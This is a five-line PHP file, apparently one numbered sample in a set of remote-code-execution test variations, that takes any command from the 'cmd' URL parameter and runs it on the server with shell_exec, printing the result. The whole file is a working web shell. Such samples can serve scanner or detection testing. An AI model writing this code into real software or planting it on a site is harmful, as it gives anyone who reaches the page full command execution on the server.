<?php
// RCE test variation #1167
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>